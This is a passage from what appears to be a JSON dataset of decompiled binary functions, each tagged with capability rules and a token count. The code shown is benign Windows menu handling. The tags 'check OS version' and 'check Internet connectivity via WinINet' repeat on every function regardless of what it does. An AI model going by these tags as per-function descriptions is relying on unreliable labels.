        "decompiled_code": "\nvoid fcn.00432a40(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x432a85;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497c00 = *0x497c00 + 1;\n    if (*0x497c00 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4922a4 == '\\0') {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00405530();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 198
    },
    "00433ab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00433c21)\n// WARNING: Removing unreachable block (ram,0x00433c2e)\n// WARNING: Removing unreachable block (ram,0x00433c3b)\n// WARNING: Removing unreachable block (ram,0x00433c41)\n// WARNING: Removing unreachable block (ram,0x00433c4e)\n// WARNING: Removing unreachable block (ram,0x00433c54)\n// WARNING: Removing unreachable block (ram,0x00433c61)\n\nvoid fcn.00433ab0(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00433ab0::var_2h + 2;\n    uStack32 = 0x433c8f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c1b;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433c1b;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00405718();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433c1b;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00433ab0::var_2h + 2;\n            fcn.00409d60();\n            fcn.00405864();\n            goto code_r0x00433c1b;\n        }\n    }\n    puStack28 = &fcn.00433ab0::var_2h + 2;\n    fcn.00433a5c();\ncode_r0x00433c1b:\n    fcn.00405530();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x433c96;\n    uStack32 = 0x433c8e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 923
    },
    "00433e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00433e94(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.00436510();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.00436520();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 238
    },
    "00433ef8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00433ef8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.00436510();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.00436510();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.00436520();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.00436520();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.00433e94(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.00433e94(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.00436520(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.00436520(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 559
    },
    "00434390": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00434390(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00433e74();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x436e80;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 332
    },
    "004344c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004344c0(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x434711;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x004346f3;\n    fcn.004055c8();\n    iVar4 = fcn.00436510();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004047dc();\n                if (cVar3 != '\\0') goto code_r0x0043455c;\n            }\n            fcn.00433ab0(0x434728, var_4h);\n            fcn.004058e0(0);\n        }\n    }\n    else {\n        var_22h = fcn.004349c4();\n    }\ncode_r0x0043455c:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.00405974();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x490484) |\n                *(*(in_EAX + 0x48) * 4 + 0x490478) | *(*(in_EAX + 0x38) * 4 + 0x490468) |\n                *(*(in_EAX + 0x39) * 4 + 0x490470);\n        iVar4 = fcn.00436510();\n        if (iVar4 < 1) {\n            uVar5 = fcn.004059dc();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.004059dc();\n            uVar5 = fcn.004349c4(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x004346f3;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.00436ad0();\n    if (iVar4 == 0) {\ncode_r0x0043459c:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x004345b2;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.004360e4();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x0043459c;\n        }\ncode_r0x004345b2:\n        var_6h = 1;\n    }\n    fcn.00405974();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x4904b8) | *(*(in_EAX + 0x3d) * 4 + 0x4904b0) | *(*(in_EAX + 0x48) * 4 + 0x49048c)\n              | *(var_5h * 4 + 0x4904c0) | *(var_6h * 4 + 0x4904c8);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x490498) | *(*(in_EAX + 0x39) * 4 + 0x4904a8) |\n              *(*(in_EAX + 0x3a) * 4 + 0x4904a0);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.004059dc();\n    iVar4 = fcn.00436510();\n    if (0 < iVar4) {\n        var_22h = fcn.004349c4();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x004346f3:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.00405530(0x434718);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1449
    },
    "00434894": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00434894(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.00434894();\n        return;\n    }\n    uVar2 = fcn.004349c4();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.004349c4(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.004349c4(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004047dc(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.004349c4();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x00434954;\n        }\n    }\n    fcn.00434754();\ncode_r0x00434954:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 468
    },
    "004349c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004349c4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.00433a04();\n        }\n        fcn.00434754();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 187
    },
    "00434c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434c6c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "004360e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004360e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.00436ad0();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "00436160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436160(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x436342;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.00436114(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.00436ad0();\n    var_10h = fcn.004360e4();\n    fcn.00405974();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x0043624b;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x0043624b:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403af4();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.00433ab0();\n        fcn.00405864();\n    }\n    uVar4 = *(uVar4 * 2 + 0x4904e0) | 0x560;\n    fcn.00434a54(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x436349);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 941
    },
    "0043639c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043639c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.00436510(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00436520();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.004363e8();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004363e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004363e8(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.004349c4(*(in_EAX + 0x50), *(param_2 * 4 + 0x490468));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043639c();\n        }\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "0043643c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043643c(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x4927cc != 2) || (iVar1 = fcn.00436510(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.004349c4(*(in_EAX + 0x14), *(param_2 * 4 + 0x490470));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 274
    },
    "004364b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004364b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.00436878();\n            fcn.00434964();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043639c();\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00436520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00436520(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.00433a04();\n    }\n    fcn.00419888();\n    return;\n}\n",
        "token_count": 61
    },
    "0043669c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043669c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.00433a04();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00404620();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.00419888();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.00419888();\n            fcn.004364b4();\n        }\n    }\n    fcn.00434964();\n    fcn.00419904();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.00436918;\n    if (in_EAX[0xd] != 0) {\n        fcn.00434894();\n    }\n    fcn.00436510();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 343
    },
    "00436754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436754(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.00436510();\n        if (param_2 < iVar1) goto code_r0x0043677a;\n    }\n    fcn.00433a04();\ncode_r0x0043677a:\n    iVar1 = fcn.00419888();\n    fcn.0041977c();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.00434894();\n    }\n    fcn.00436510();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 227
    },
    "00436918": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436918(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.00434894();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 != '\\0') {\n            fcn.0043889c();\n        }\n    }\n    else {\n        fcn.00436918(0);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004375e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004375e4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.0043776c(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.00436510();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00436520();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.00436520();\n                    cVar1 = fcn.004375c0();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.00436520();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.00436510();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.00436520();\n                cVar1 = fcn.004375c0();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.00436520();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 